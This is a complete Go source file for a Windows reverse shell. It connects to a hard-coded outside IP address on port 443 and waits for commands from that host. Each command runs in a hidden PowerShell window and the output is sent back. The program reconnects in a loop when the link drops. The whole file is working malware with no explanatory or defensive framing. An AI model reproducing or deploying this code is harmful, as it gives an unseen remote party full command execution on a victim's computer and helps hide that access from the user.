package main

import (
	"bufio"
	"net"
	"os/exec"
	"syscall"
	"time"
)

func main() {
	bubirfonksiyondur("35.198.179.65:443")
}

func bubirfonksiyondur(host string) {
	c, err := net.Dial("tcp", host)
	if err != nil {
		if nil != c {
			c.Close()
		}
		time.Sleep(time.Second + 25)
		bubirfonksiyondur(host)
	}
	reader := bufio.NewReader(c)
	siyahekran := "powershell.exe"
	küllük := "siyahekran > "

	for {
		c.Write([]byte(küllük))
		command, err := reader.ReadString('\n')
		if err != nil {
			c.Close()
			bubirfonksiyondur(host)

		}

		cmd := exec.Command(siyahekran, "/c", command+"\n")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()
		c.Write(out)
	}

}
